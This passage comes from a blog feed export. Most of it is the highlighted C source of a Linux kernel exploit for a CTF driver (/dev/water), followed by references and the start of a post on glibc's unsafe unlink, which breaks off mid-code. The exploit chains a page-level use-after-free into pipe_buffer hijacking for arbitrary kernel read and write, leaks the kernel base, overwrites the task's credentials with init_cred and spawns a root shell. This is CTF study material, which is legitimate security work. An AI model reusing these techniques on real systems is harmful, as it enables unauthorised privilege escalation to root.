class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.2 origin pipe to make second page level uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == snd_origin_idx || i == victim_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl() pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 2 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">  evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">  evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 2 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_2 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 2: %d&quot;</span>, self_pipe_idx_2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 2!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 3 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_3 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 3: %d&quot;</span>, self_pipe_idx_3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_3 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 3!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try hijack pipe 4 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 4 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2 || i == self_pipe_idx_3) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_4 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 4: %d&quot;</span>, self_pipe_idx_4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_4 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 4!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find self rw pipe 2 3 4 successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_evil_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;set up 2 3 4 pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_2, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_3, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_4, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0xff8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* hijack 3 -&gt; 4 */</span></span><br><span class="line">  evil_pipe_buf_3.offset = TRD_PIPE_BUFS_SIZE * <span class="number">3</span>;</span><br><span class="line">  evil_pipe_buf_3.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ?? 写4</span></span><br><span class="line">  <span class="comment">// 因为写 pipe 时从 offset + len 开始写，就是写入3中</span></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 to write pipe 4&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_4.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf_4.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_read</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0x1ff8</span>;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="comment">/* read 2 */</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_write</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_write;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">info_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;info leak&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;setup kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_evil_pipe</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;leaking something by search memory&quot;</span>);</span><br><span class="line">  vmemmap_base = (<span class="type">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">  <span class="comment">// log_info(&quot;vmemmap_base: %#lx&quot;, vmemmap_base);</span></span><br><span class="line">  <span class="comment">// debug(&quot;vmemmap_base&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">      kernel_base = buf[<span class="number">0</span>] - <span class="number">0x070</span>;</span><br><span class="line">      kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;Found kernel base: %#lx\n\t\t&quot;</span></span><br><span class="line">          <span class="string">&quot;Kernel offset: %#lx&quot;</span>,</span><br><span class="line">          kernel_base, kernel_offset);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;vmemmap_base: %#lx&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;seek task_struct in memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">prctl</span>(PR_SET_NAME, <span class="string">&quot;waterkernelpwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = <span class="built_in">memmem</span>(buf, <span class="number">0xf00</span>, <span class="string">&quot;waterkernelpwn&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>)           <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>)    <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123; <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">      parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">      current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">      page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">      page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">             (<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m%#lx\n&quot;</span>,</span><br><span class="line">             page_offset_base);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">          <span class="string">&quot;%#lx\n\n&quot;</span>,</span><br><span class="line">          current_task);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>()) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">  page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privilege_escalation_by_task_overwrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">size_t</span> ptask_page_addr = <span class="built_in">direct_map_addr_to_page_addr</span>(parent_task);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)ptask_page_addr, buf);</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">    <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init_task = parent_task;</span><br><span class="line">  init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">  init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_task_page = <span class="built_in">direct_map_addr_to_page_addr</span>(current_task);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)current_task_page, buf);</span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">  tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">  tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_root_shell</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bind_core</span><span class="params">(<span class="type">int</span> core)</span> </span>&#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;cpu_set);</span><br><span class="line">  <span class="built_in">CPU_SET</span>(core, &amp;cpu_set);</span><br><span class="line">  <span class="built_in">sched_setaffinity</span>(<span class="built_in">getpid</span>(), <span class="built_in">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">bind_core</span>(<span class="number">0</span>);</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">second_page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">construct_self_pipe</span>();</span><br><span class="line">  <span class="built_in">info_leak</span>();</span><br><span class="line">  <span class="built_in">privilege_escalation_by_task_overwrite</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等哪天心血来潮在做一遍吧</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel 堆溢出漏洞分析与利用</a></li>
<li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache 出题手记 - arttnba3’s blog</a></li>
<li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">星盟：强网拟态2023 Writeup</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJB：2023强网拟态预赛 WP</a></li>
<li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronic：第六届“强网”拟态</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>unsafe-unlink</title>
    <url>/2023/09/13/unsafe-unlink/</url>
    <content><![CDATA[<blockquote>
<p>经典漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>当一个 free chunk 从双向链表的 bins 中取出时（堆的合并），这个过程就是 unlink。</p>
<p>堆的合并主要看这一段代码，存在两种合并方式</p>
<ul>
<li>int_free 参数：p是正在free的chunk，av 指 arena(struct malloc_state)，lock避免条件竞争</li>
<li>向后合并：prev_inuse位为0，会发生unsorted bin之间合并，会检查prev_size 和 想要合并的 bin 的 size 是否相同。unlink prev_chunk</li>
<li>向前合并：不是top_chunk, unlink nextchunk。</li>
<li>至于方向：在没有翻译错误的情况下，有点绕，但是可以强行解释，因为堆往高地址生长，向前就是向高地址合并，向后就是向低地址合并？</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,就是前面的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  就是根据size进行加法，是一个宏，就是当前chunk的下一个chunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span 